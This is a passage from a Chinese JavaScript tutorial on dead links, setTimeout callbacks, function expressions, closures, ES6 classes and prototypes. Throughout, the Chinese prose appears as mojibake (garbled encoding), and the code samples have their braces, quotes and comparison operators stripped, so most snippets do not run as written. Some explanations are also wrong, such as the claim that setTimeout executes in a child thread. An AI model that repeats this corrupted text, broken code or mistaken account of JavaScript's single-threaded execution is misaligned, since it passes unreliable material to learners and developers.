ä¹Ÿå°±æ˜¯ç½‘é¡µçš„ä¸Šç«¯ã€‚ è€Œjavascript:void(0), ä»…ä»…è¡¨ç¤ºä¸€ä¸ªæ­»é“¾æ¥ã€‚ åœ¨é¡µé¢å¾ˆé•¿çš„æ—¶å€™ä¼šä½¿ç”¨ # æ¥å®šä½é¡µé¢çš„å…·ä½“ä½ç½®ï¼Œæ ¼å¼ä¸ºï¼š**# + id** a href=javascript:void(0);ç‚¹æˆ‘æ²¡æœ‰ååº”çš„!/aa href=#posç‚¹æˆ‘å®šä½åˆ°æŒ‡å®šä½ç½®!/abr...brp id=poså°¾éƒ¨å®šä½ç‚¹/p å¼‚æ­¥ç¼–ç¨‹ï¼ˆå›è°ƒå‡½æ•°ï¼‰åŒæ­¥æŒ‰ä½ çš„ä»£ç é¡ºåºæ‰§è¡Œï¼Œå¼‚æ­¥ä¸æŒ‰ç…§ä»£ç é¡ºåºæ‰§è¡Œï¼Œå¼‚æ­¥çš„æ‰§è¡Œæ•ˆç‡æ›´é«˜ã€‚ é€šä¿—åœ°è§£é‡Šä¸€ä¸‹å°±æ˜¯ä»ä¸»çº¿ç¨‹å‘å°„ä¸€ä¸ªå­çº¿ç¨‹æ¥å®Œæˆä»»åŠ¡ ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ åœ¨å‰ç«¯ç¼–ç¨‹ä¸­ï¼ˆç”šè‡³åç«¯æœ‰æ—¶ä¹Ÿæ˜¯è¿™æ ·ï¼‰ï¼Œæˆ‘ä»¬åœ¨å¤„ç†ä¸€äº›ç®€çŸ­ã€å¿«é€Ÿçš„æ“ä½œæ—¶ï¼Œä¾‹å¦‚è®¡ç®— 1 + 1 çš„ç»“æœï¼Œå¾€å¾€åœ¨ä¸»çº¿ç¨‹ä¸­å°±å¯ä»¥å®Œæˆã€‚ä¸»çº¿ç¨‹ä½œä¸ºä¸€ä¸ªçº¿ç¨‹ï¼Œä¸èƒ½å¤ŸåŒæ—¶æ¥å—å¤šæ–¹é¢çš„è¯·æ±‚ã€‚æ‰€ä»¥ï¼Œå½“ä¸€ä¸ªäº‹ä»¶æ²¡æœ‰ç»“æŸæ—¶ï¼Œç•Œé¢å°†æ— æ³•å¤„ç†å…¶ä»–è¯·æ±‚ã€‚ ç°åœ¨æœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®å®ƒçš„ onclick äº‹ä»¶ä¸ºä¸€ä¸ªæ­»å¾ªç¯ï¼Œé‚£ä¹ˆå½“è¿™ä¸ªæŒ‰é’®æŒ‰ä¸‹ï¼Œæ•´ä¸ªç½‘é¡µå°†å¤±å»å“åº”ã€‚ ä¸ºäº†é¿å…è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œæˆ‘ä»¬å¸¸å¸¸ç”¨å­çº¿ç¨‹æ¥å®Œæˆä¸€äº›å¯èƒ½æ¶ˆè€—æ—¶é—´è¶³å¤Ÿé•¿ä»¥è‡³äºè¢«ç”¨æˆ·å¯Ÿè§‰çš„äº‹æƒ…ï¼Œæ¯”å¦‚è¯»å–ä¸€ä¸ªå¤§æ–‡ä»¶æˆ–è€…å‘å‡ºä¸€ä¸ªç½‘ç»œè¯·æ±‚ã€‚å› ä¸ºå­çº¿ç¨‹ç‹¬ç«‹äºä¸»çº¿ç¨‹ï¼Œæ‰€ä»¥å³ä½¿å‡ºç°é˜»å¡ä¹Ÿä¸ä¼šå½±å“ä¸»çº¿ç¨‹çš„è¿è¡Œã€‚ä½†æ˜¯å­çº¿ç¨‹æœ‰ä¸€ä¸ªå±€é™ï¼šä¸€æ—¦å‘å°„äº†ä»¥åå°±ä¼šä¸ä¸»çº¿ç¨‹å¤±å»åŒæ­¥ï¼Œæˆ‘ä»¬æ— æ³•ç¡®å®šå®ƒçš„ç»“æŸï¼Œå¦‚æœç»“æŸä¹‹åéœ€è¦å¤„ç†ä¸€äº›äº‹æƒ…ï¼Œæ¯”å¦‚å¤„ç†æ¥è‡ªæœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•å°†å®ƒåˆå¹¶åˆ°ä¸»çº¿ç¨‹ä¸­å»çš„ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒJavaScript ä¸­çš„å¼‚æ­¥æ“ä½œå‡½æ•°å¾€å¾€é€šè¿‡å›è°ƒå‡½æ•°æ¥å®ç°å¼‚æ­¥ä»»åŠ¡çš„ç»“æœå¤„ç†ã€‚ å›è°ƒå‡½æ•° å›è°ƒå‡½æ•°å°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ˜¯åœ¨æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡çš„æ—¶å€™å°±å‘Šè¯‰å®ƒï¼šç­‰ä½ å®Œæˆäº†è¿™ä¸ªä»»åŠ¡ä¹‹åè¦å¹²ä»€ä¹ˆ script setTimeout(function() document.getElementById(demo).innerHTML=Messi!; ,3000);/script setTimeout å‡½æ•°æ˜¯ JavaScript ä¸­çš„ä¸€ä¸ªå®šæ—¶å™¨å‡½æ•°ï¼Œç”¨äºåœ¨ä¸€å®šçš„æ—¶é—´å»¶è¿Ÿåæ‰§è¡ŒæŒ‡å®šçš„ä»£ç æˆ–å‡½æ•°ï¼›åŸºç¡€è¯­æ³•å¦‚ä¸‹ï¼š setTimeout(function, milliseconds); å…¶ä¸­function æ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–ä»£ç å—ï¼›milliseconds æ˜¯å»¶è¿Ÿçš„æ¯«ç§’æ•° ç”±äºsetTimeoutæ˜¯åœ¨å­çº¿ç¨‹ä¸­æ‰§è¡Œçš„ï¼Œä¸»çº¿ç¨‹æ²¡æœ‰åœæ­¢ï¼Œåœ¨ä¸»çº¿ç¨‹é‡Œé¢å¯ä»¥æ‰§è¡Œå…¶ä»–å‡½æ•° script setTimeout(function() document.getElementById(demo).innerHTML=Messi!;//å­çº¿ç¨‹ ,3000); document.getElementById(demo2).innerHTML=MCI!;//ä¸»çº¿ç¨‹/script HTMLè½½å…¥å¤–éƒ¨JavaScriptæ–‡ä»¶script src=myscript.js JSå‡½æ•°å‡½æ•°å®šä¹‰å‡½æ•°è¡¨è¾¾å¼å­˜å‚¨åœ¨å˜é‡åï¼Œå˜é‡ä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå‡½æ•°ä½¿ç”¨ scriptvar x = function (a, b) return a * b;document.getElementById(demo).innerHTML = x(4, 3);/script å‡½æ•°å­˜å‚¨åœ¨å˜é‡ä¸­ï¼Œä¸éœ€è¦å‡½æ•°åç§°ï¼Œé€šå¸¸é€šè¿‡å˜é‡åæ¥è°ƒç”¨ï¼Œä¸Šè¿°å‡½æ•°ä»¥åˆ†å·ç»“å°¾æ˜¯å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªæ‰§è¡Œè¯­å¥ è‡ªè°ƒç”¨å‡½æ•° è‡ªè°ƒç”¨å‡½æ•°æ˜¯æŒ‡åœ¨å®šä¹‰åç«‹å³æ‰§è¡Œçš„ JavaScript å‡½æ•°ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š (function() // åœ¨è¿™é‡Œç¼–å†™å‡½æ•°ä½“)(); å®ä¾‹å¦‚ä¸‹ï¼š script(function () document.getElementById(demo).innerHTML = Hello! æˆ‘æ˜¯è‡ªå·±è°ƒç”¨çš„;)();/script åœ¨JavaScriptä¸­æŠŠå‡½æ•°æè¿°ä¸ºå¯¹è±¡æ›´åŠ çš„å‡†ç¡®ä¸€ç‚¹ï¼Œè¿™é‡Œçš„å‡½æ•°ä¹Ÿæœ‰å±æ€§å’Œæ–¹æ³• ä¾‹å­ï¼šarguments.length å±æ€§è¿”å›å‡½æ•°è°ƒç”¨è¿‡ç¨‹æ¥æ”¶åˆ°çš„å‚æ•°ä¸ªæ•° scriptfunction myFunction(a, b) return arguments.length;document.getElementById(demo).innerHTML = myFunction(4, 3);/script toString() æ–¹æ³•å°†å‡½æ•°ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¿”å› scriptfunction myFunction(a, b) return a * b;document.getElementById(demo).innerHTML = myFunction.toString();/script ç®­å¤´å‡½æ•° ç®­å¤´å‡½æ•°çš„è¡¨è¾¾å¼æ›´åŠ çš„ç®€æ´ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š (å‚æ•°1, å‚æ•°2, â€¦, å‚æ•°N) = å‡½æ•°å£°æ˜ (å‚æ•°1, å‚æ•°2, â€¦, å‚æ•°N) = è¡¨è¾¾å¼(å•ä¸€)// ç›¸å½“äºï¼š(å‚æ•°1, å‚æ•°2, â€¦, å‚æ•°N) = return è¡¨è¾¾å¼; å½“åªæœ‰ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œåœ†æ‹¬å·æ˜¯å¯åŠ å¯ä¸åŠ çš„ (å•ä¸€å‚æ•°) = å‡½æ•°å£°æ˜å•ä¸€å‚æ•° = å‡½æ•°å£°æ˜ æ²¡æœ‰å‚æ•°çš„å‡½æ•°åœ†æ‹¬å·ä¸èƒ½çœç•¥ï¼š() = å‡½æ•°å£°æ˜ ä¾‹å­å¦‚ä¸‹ï¼š scriptconst x = (x, y) = x * y;document.getElementById(demo).innerHTML = x(5, 5);/script å‡½æ•°å‚æ•°æ˜¾å¼å‚æ•°å’Œéšå¼å‚æ•° å‡½æ•°æ˜¾å¼å‚æ•°åœ¨å‡½æ•°å®šä¹‰æ—¶åˆ—å‡ºï¼›éšå¼å‚æ•°åœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼ é€’ç»™å‡½æ•°çœŸæ­£çš„å€¼ã€‚ ES5 ä¸­å¦‚æœå‡½æ•°åœ¨è°ƒç”¨æ—¶æœªæä¾›éšå¼å‚æ•°ï¼Œå‚æ•°ä¼šé»˜è®¤è®¾ç½®ä¸ºï¼š undefined è§£é‡Šï¼šy=y||0ï¼Œå¦‚æœ y å·²ç»å®šä¹‰ï¼Œy || 0 è¿”å› yï¼Œå› ä¸º y æ˜¯ trueï¼Œå¦åˆ™è¿”å› 0ï¼Œå› ä¸º undefined ä¸º falseã€‚ ES6 æ”¯æŒå‡½æ•°å¸¦æœ‰é»˜è®¤å‚æ•° function myFunction(x, y = 10) // y is 10 if not passed or undefined return x + y;myFunction(0, 2) // è¾“å‡º 2myFunction(5); // è¾“å‡º 15, y å‚æ•°çš„é»˜è®¤å€¼ argumentså¯¹è±¡ JavaScript å‡½æ•°æœ‰ä¸ªå†…ç½®çš„å¯¹è±¡ arguments å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†å‡½æ•°è°ƒç”¨çš„å‚æ•°æ•°ç»„ã€‚ é€šè¿‡è¿™ç§æ–¹å¼ä½ å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ‰¾åˆ°æœ€å¤§çš„ä¸€ä¸ªå‚æ•°çš„å€¼ scriptx = findMax(1, 123, 500, 115, 44, 88);function findMax() var i, max = arguments[0]; if(arguments.length 2) return max; for (i = 0; i arguments.length; i++) if (arguments[i] max) max = arguments[i]; return max;document.getElementById(demo).innerHTML = x;/script å‡½æ•°è°ƒç”¨ä½¿ç”¨æ„é€ å‡½æ•°è°ƒç”¨å‡½æ•° å¦‚æœå‡½æ•°è°ƒç”¨å‰ä½¿ç”¨äº† new å…³é”®å­—, åˆ™æ˜¯è°ƒç”¨äº†æ„é€ å‡½æ•°ã€‚ è¿™çœ‹èµ·æ¥å°±åƒåˆ›å»ºäº†æ–°çš„å‡½æ•°ï¼Œä½†å®é™…ä¸Š JavaScript å‡½æ•°æ˜¯é‡æ–°åˆ›å»ºçš„å¯¹è±¡ scriptfunction myFunction(arg1, arg2) this.firstName = arg1; this.lastName = arg2;var x = new myFunction(John,Doe)document.getElementById(demo).innerHTML = x.firstName; /script myFunctionæ˜¯æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°çš„è°ƒç”¨ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚æ–°å¯¹è±¡ä¼šç»§æ‰¿æ„é€ å‡½æ•°çš„å±æ€§å’Œæ–¹æ³• æ„é€ å‡½æ•°ä¸­ this å…³é”®å­—æ²¡æœ‰ä»»ä½•çš„å€¼ã€‚this çš„å€¼åœ¨å‡½æ•°è°ƒç”¨å®ä¾‹åŒ–å¯¹è±¡(new object)æ—¶åˆ›å»ºã€‚ ä½œä¸ºå‡½æ•°æ–¹æ³•è°ƒç”¨å‡½æ•° å‰æ–‡ä¸­çš„thiså…³é”®å­—ä¸€èŠ‚ä¸­ä¹Ÿæœ‰æåˆ°è¿‡ call() å’Œ apply() æ˜¯é¢„å®šä¹‰çš„å‡½æ•°æ–¹æ³•ã€‚ ä¸¤ä¸ªæ–¹æ³•å¯ç”¨äºè°ƒç”¨å‡½æ•°ï¼Œä¸¤ä¸ªæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯å¯¹è±¡æœ¬èº«ã€‚ scriptvar myObject;function myFunction(a, b) return a * b;myObject = myFunction.call(myObject, 10, 2); // è¿”å› 20document.getElementById(demo).innerHTML = myObject; /script é—­åŒ…å˜é‡å£°æ˜æ—¶å¦‚æœä¸ä½¿ç”¨ var å…³é”®å­—ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå³ä¾¿å®ƒåœ¨å‡½æ•°å†…å®šä¹‰ã€‚ åœ¨ JavaScript ä¸­ï¼Œå‡½æ•°å¯ä»¥è®¿é—®å…¶å®šä¹‰æ—¶æ‰€åœ¨çš„ä½œç”¨åŸŸä¸­çš„å˜é‡ã€‚å½“ä¸€ä¸ªå‡½æ•°åœ¨å¦ä¸€ä¸ªå‡½æ•°å†…éƒ¨è¢«å®šä¹‰æ—¶ï¼Œå®ƒå¯ä»¥è®¿é—®åŒ…å«å®ƒçš„å¤–éƒ¨å‡½æ•°çš„ä½œç”¨åŸŸï¼Œå½¢æˆäº†é—­åŒ… é—­åŒ…æ˜¯æŒ‡ä¸€ä¸ªå‡½æ•°å’Œå…¶å‘¨å›´çš„çŠ¶æ€çš„ç»„åˆã€‚è¿™ä¸ªç¯å¢ƒåŒ…å«äº†å‡½æ•°åˆ›å»ºæ—¶æ‰€å¤„çš„ä½œç”¨åŸŸä¸­çš„æ‰€æœ‰å±€éƒ¨å˜é‡ï¼Œä»¥åŠå®ƒä»¬çš„å€¼ã€‚è¿™æ„å‘³ç€å‡½æ•°å¯ä»¥è®¿é—®å…¶å¤–éƒ¨ä½œç”¨åŸŸä¸­å®šä¹‰çš„å˜é‡ï¼Œå³ä½¿åœ¨å®ƒè¢«è°ƒç”¨æ—¶ï¼Œè¿™äº›å˜é‡å·²ç»ä¸å†å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚ é—­åŒ…é€šå¸¸ç”±ä»¥ä¸‹ä¸¤ä¸ªç‰¹ç‚¹ç»„æˆï¼š å†…éƒ¨å‡½æ•°å¼•ç”¨å¤–éƒ¨å˜é‡ï¼šé—­åŒ…å‡½æ•°å†…éƒ¨å®šä¹‰çš„å‡½æ•°å¼•ç”¨äº†å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚ å¤–éƒ¨å‡½æ•°è¿”å›å†…éƒ¨å‡½æ•°ï¼šå¤–éƒ¨å‡½æ•°è¿”å›äº†å†…éƒ¨å®šä¹‰çš„å‡½æ•°ï¼Œä½¿å¾—è¯¥å‡½æ•°çš„ä½œç”¨åŸŸä»ç„¶å¯ä»¥è®¿é—®å¤–éƒ¨å‡½æ•°ä¸­çš„å˜é‡ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªè°ƒç”¨å‡½æ•°æ¥å®ç°é—­åŒ… script var add=(function() var counter=0; return function()return counter +=1; )(); function myFunction() document.getElementById(demo).innerHTML=add(); /script å¯¹ä¸Šè¿°ä»£ç çš„è§£é‡Šï¼švar add = (function() ... )();ï¼šè¿™æ˜¯ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼ï¼ˆImmediately Invoked Function Expressionï¼ŒIIFEï¼‰ã€‚è¿™ä¸ªå‡½æ•°è¿”å›äº†ä¸€ä¸ªå†…éƒ¨å‡½æ•°ï¼Œå¹¶å°†è¿™ä¸ªå†…éƒ¨å‡½æ•°èµ‹å€¼ç»™å˜é‡ addã€‚åœ¨è¿™ä¸ªå†…éƒ¨å‡½æ•°å†…éƒ¨ï¼Œåˆ›å»ºäº†ä¸€ä¸ªç§æœ‰å˜é‡ counterï¼Œå¹¶è¿”å›ä¸€ä¸ªé—­åŒ…å‡½æ•°ï¼Œè¿™ä¸ªé—­åŒ…å‡½æ•°ç”¨æ¥é€’å¢ counter çš„å€¼ counter æ˜¯ä¸€ä¸ªé—­åŒ…å˜é‡ï¼Œå®ƒè¢«åŒ…å«åœ¨è¿”å›çš„åŒ¿åå‡½æ•°å†…éƒ¨ï¼Œå¹¶ä¸”ç”±äºé—­åŒ…çš„ç‰¹æ€§ï¼Œè¯¥å˜é‡åœ¨å‡½æ•°æ‰§è¡Œå®Œæ¯•åå¹¶ä¸ä¼šè¢«é”€æ¯ï¼Œè€Œæ˜¯ä¼šä¸€ç›´ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç›´åˆ°ç¨‹åºé€€å‡ºæˆ–è€…æ‰‹åŠ¨é‡Šæ”¾ï¼Œå› æ­¤ï¼Œæ¯æ¬¡è°ƒç”¨ add å‡½æ•°æ—¶ï¼Œå®é™…ä¸Šæ˜¯åœ¨è°ƒç”¨è¿”å›çš„é—­åŒ…å‡½æ•°ï¼Œè¿™ä¸ªé—­åŒ…å‡½æ•°ä¸­çš„ counter å˜é‡ä¼šä¿ç•™ä¹‹å‰çš„å€¼ï¼Œå¹¶åœ¨æ¯æ¬¡è°ƒç”¨æ—¶è¿›è¡Œç´¯åŠ æ“ä½œ ä¹Ÿå¯ä»¥è¿™æ ·è¯´ï¼Œcounter å˜é‡æ˜¯åœ¨å¤–éƒ¨å‡½æ•°ä½œç”¨åŸŸä¸­å®šä¹‰çš„ï¼Œå³ IIFE çš„ä½œç”¨åŸŸã€‚è€Œå†…éƒ¨å‡½æ•°ï¼ˆé—­åŒ…å‡½æ•°ï¼‰ä¿ç•™äº†å¯¹è¿™ä¸ªä½œç”¨åŸŸçš„å¼•ç”¨ï¼Œå› æ­¤å®ƒå¯ä»¥åœ¨æ¯æ¬¡è°ƒç”¨æ—¶è®¿é—®å’Œä¿®æ”¹ counter å˜é‡çš„å€¼ ç±»ç±»çš„åŸºç¡€ä½¿ç”¨ class å…³é”®å­—æ¥åˆ›å»ºä¸€ä¸ªç±»ï¼Œç±»ä½“åœ¨ä¸€å¯¹å¤§æ‹¬å· {} ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¤§æ‹¬å· {} ä¸­å®šä¹‰ç±»æˆå‘˜çš„ä½ç½®ï¼Œå¦‚æ–¹æ³•æˆ–æ„é€ å‡½æ•°ã€‚ æ¯ä¸ªç±»ä¸­åŒ…å«äº†ä¸€ä¸ªç‰¹æ®Šçš„æ–¹æ³• **constructor()**ï¼Œå®ƒæ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œè¿™ç§æ–¹æ³•ç”¨äºåˆ›å»ºå’Œåˆå§‹åŒ–ä¸€ä¸ªç”± class åˆ›å»ºçš„å¯¹è±¡ã€‚ åˆ›å»ºä¸€ä¸ªç±»çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š class ClassName constructor() ... åœ¨å®šä¹‰å¥½ç±»ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ newå…³é”®å­—æ¥åˆ›å»ºå¯¹è±¡ï¼š script class MNC constructor(name,captain) this.name=name; this.captain=captain; let site=new MNC(MNC,é²æœ¬); document.getElementById(demo).innerHTML=site.name+: +site.captain;/script åˆ›å»ºå¯¹è±¡æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•°æ–¹æ³• constructor() ç±»è¡¨è¾¾å¼ ç±»è¡¨è¾¾å¼æ˜¯å®šä¹‰ç±»çš„å¦ä¸€ç§æ–¹æ³•ã€‚ç±»è¡¨è¾¾å¼å¯ä»¥å‘½åæˆ–ä¸å‘½åã€‚å‘½åç±»è¡¨è¾¾å¼çš„åç§°æ˜¯è¯¥ç±»ä½“çš„å±€éƒ¨åç§°ã€‚ å®ä¾‹ï¼š // æœªå‘½å/åŒ¿åç±»let Runoob = class constructor(name, url) this.name = name; this.url = url; ;console.log(Runoob.name);// output: Runoob // å‘½åç±»let Runoob = class Runoob2 constructor(name, url) this.name = name; this.url = url; ;console.log(Runoob.name);// è¾“å‡º: Runoob2 æ„é€ æ–¹æ³• æ„é€ æ–¹æ³•æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼š æ„é€ æ–¹æ³•åä¸º constructor()ã€‚ æ„é€ æ–¹æ³•åœ¨åˆ›å»ºæ–°å¯¹è±¡æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œã€‚ æ„é€ æ–¹æ³•ç”¨äºåˆå§‹åŒ–å¯¹è±¡å±æ€§ã€‚ å¦‚æœä¸å®šä¹‰æ„é€ æ–¹æ³•ï¼ŒJavaScript ä¼šè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªç©ºçš„æ„é€ æ–¹æ³•ã€‚ ç±»çš„æ–¹æ³• ä½¿ç”¨å…³é”®å­— class åˆ›å»ºä¸€ä¸ªç±»ï¼Œå¯ä»¥æ·»åŠ ä¸€ä¸ª constructor() æ–¹æ³•ï¼Œç„¶åæ·»åŠ ä»»æ„æ•°é‡çš„æ–¹æ³• script class King constructor(name,year) this.name=name; this.year=year; age() let date=new Date(); return date.getFullYear()-this.year; let king=new King(Messi,2022); document.getElementById(demo).innerHTML=Messi is the king for +king.age()+ years.;/script ä¹Ÿå¯ä»¥å‘ç±»çš„æ–¹æ³•å‘é€å‚æ•° scriptclass Runoob constructor(name, year) this.name = name; this.year = year; age(x) return x - this.year; let date = new Date();let year = date.getFullYear();let runoob = new Runoob(èœé¸Ÿæ•™ç¨‹, 2020);document.getElementById(demo).innerHTML=èœé¸Ÿæ•™ç¨‹ + runoob.age(year) + å²äº†ã€‚;/script ç±»å…³é”®å­— å…³é”®å­— æè¿° extends ç»§æ‰¿ä¸€ä¸ªç±» static åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ªé™æ€æ–¹æ³• super è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³• ç±»ç»§æ‰¿ä½¿ç”¨ES6ç±»ç»§æ‰¿ JavaScript ç±»ç»§æ‰¿ä½¿ç”¨ extends å…³é”®å­—ã€‚ ç»§æ‰¿å…è®¸æˆ‘ä»¬ä¾æ®å¦ä¸€ä¸ªç±»æ¥å®šä¹‰ä¸€ä¸ªç±»ï¼Œè¿™ä½¿å¾—åˆ›å»ºå’Œç»´æŠ¤ä¸€ä¸ªåº”ç”¨ç¨‹åºå˜å¾—æ›´å®¹æ˜“ã€‚ super() æ–¹æ³•ç”¨äºè°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚ å½“åˆ›å»ºä¸€ä¸ªç±»æ—¶ï¼Œæ‚¨ä¸éœ€è¦é‡æ–°ç¼–å†™æ–°çš„æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°ï¼Œåªéœ€æŒ‡å®šæ–°å»ºçš„ç±»ç»§æ‰¿äº†ä¸€ä¸ªå·²æœ‰çš„ç±»çš„æˆå‘˜å³å¯ã€‚è¿™ä¸ªå·²æœ‰çš„ç±»ç§°ä¸ºåŸºç±»ï¼ˆçˆ¶ç±»ï¼‰ï¼Œæ–°å»ºçš„ç±»ç§°ä¸ºæ´¾ç”Ÿç±»ï¼ˆå­ç±»ï¼‰ã€‚ ç»§æ‰¿ä»£è¡¨äº† is a å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå“ºä¹³åŠ¨ç‰©æ˜¯åŠ¨ç‰©ï¼Œç‹—æ˜¯å“ºä¹³åŠ¨ç‰©ï¼Œå› æ­¤ï¼Œç‹—æ˜¯åŠ¨ç‰©ï¼Œç­‰ç­‰ã€‚ script class Who constructor(name) this.name = name; present() return æˆ‘å–œæ¬¢ + this.name; class King extends Who constructor(name,age) super(name); this.age=age; show() return this.present()+ï¼Œä»–æˆä¸ºçƒç‹+this.age+å¹´äº†ã€‚; let king=new King(æ¢…è¥¿,2); document.getElementById(demo).innerHTML=king.show();/script super() æ–¹æ³•å¼•ç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚ é€šè¿‡åœ¨æ„é€ æ–¹æ³•ä¸­è°ƒç”¨ super() æ–¹æ³•ï¼Œæˆ‘ä»¬è°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥è®¿é—®çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚ ä½¿ç”¨åŸå‹é“¾ç»§æ‰¿ è¯¦æƒ…è§ä¸‹ä¸€èŠ‚ getterå’Œsetter ç±»ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ getter å’Œ setter æ¥è·å–å’Œè®¾ç½®å€¼ï¼Œgetter å’Œ setter éƒ½éœ€è¦åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹æ‰§è¡Œã€‚ ç±»ä¸­æ·»åŠ  getter å’Œ setter ä½¿ç”¨çš„æ˜¯ get å’Œ set å…³é”®å­—ï¼Œå®ä¾‹å¦‚ä¸‹ï¼š scriptclass Runoob constructor(name) this._sitename = name; get sitename() return this._sitename; set sitename(x) this._sitename = x; let noob = new Runoob(èœé¸Ÿæ•™ç¨‹);document.getElementById(demo).innerHTML = noob.sitename;/script gettersetter æ–¹æ³•çš„åç§°ä¸èƒ½ä¸å±æ€§çš„åç§°ç›¸åŒï¼Œå¾ˆå¤šå¼€å‘è€…åœ¨å±æ€§åç§°å‰ä½¿ç”¨ä¸‹åˆ’çº¿å­—ç¬¦ _ å°† gettersetter ä¸å®é™…å±æ€§åˆ†å¼€ é™æ€æ–¹æ³•é™æ€æ–¹æ³•æ˜¯ä½¿ç”¨ static å…³é”®å­—ä¿®é¥°çš„æ–¹æ³•ï¼Œåˆå«ç±»æ–¹æ³•ï¼Œå±äºç±»çš„ï¼Œä½†ä¸å±äºå¯¹è±¡ï¼Œåœ¨å®ä¾‹åŒ–å¯¹è±¡ä¹‹å‰å¯ä»¥é€šè¿‡ ç±»å.æ–¹æ³•å è°ƒç”¨é™æ€æ–¹æ³•ã€‚é™æ€æ–¹æ³•ä¸èƒ½åœ¨å¯¹è±¡ä¸Šè°ƒç”¨ï¼Œåªèƒ½åœ¨ç±»ä¸­è°ƒç”¨ã€‚ å¦‚æœæƒ³åœ¨å¯¹è±¡ä¸­ä½¿ç”¨é™æ€æ–¹æ³•ï¼Œå¯ä»¥æŠŠå¯¹è±¡ä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ é€’ç»™å®ƒï¼š scriptclass Runoob constructor(name) this.name = name; static hello(x) return Hello + x.name; let noob = new Runoob(èœé¸Ÿæ•™ç¨‹);document.getElementById(demo).innerHTML = Runoob.hello(noob);/script åŸå‹é“¾æ„é€ å‡½æ•° å®ä¾‹å¦‚ä¸‹ function Person(name, age) this.name = name; this.age = age; åŸå‹å¯¹è±¡ JSçš„æ¯ä¸ªå‡½æ•°åœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªå±æ€§prototypeï¼Œè¿™ä¸ªå±æ€§æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯æ­¤å‡½æ•°çš„åŸå‹å¯¹è±¡ã€‚è¯¥åŸå‹å¯¹è±¡ä¸­æœ‰ä¸ªå±æ€§ä¸ºconstructorï¼ŒæŒ‡å‘è¯¥å‡½æ•°ã€‚è¿™æ ·åŸå‹å¯¹è±¡å’Œå®ƒçš„å‡½æ•°ä¹‹é—´å°±äº§ç”Ÿäº†è”ç³»ã€‚ **_proto_** æ¯ä¸ªé€šè¿‡æ„é€ å‡½æ•°åˆ›å»ºå‡ºæ¥çš„å®ä¾‹å¯¹è±¡ï¼Œå…¶æœ¬èº«æœ‰ä¸ªå±æ€§__proto__ï¼Œè¿™ä¸ªå±æ€§ä¼šæŒ‡å‘è¯¥å®ä¾‹å¯¹è±¡çš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§æ—¶ï¼Œä¼šå…ˆåœ¨è¿™ä¸ªå¯¹è±¡æœ¬èº«å±æ€§ä¸ŠæŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¼šé€šè¿‡å®ƒçš„__proto__éšå¼å±æ€§ï¼Œæ‰¾åˆ°å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°å°±ä¼šå†åœ¨å…¶æ„é€ å‡½æ•°çš„prototypeçš„__proto__ä¸­æŸ¥æ‰¾ï¼Œè¿™æ 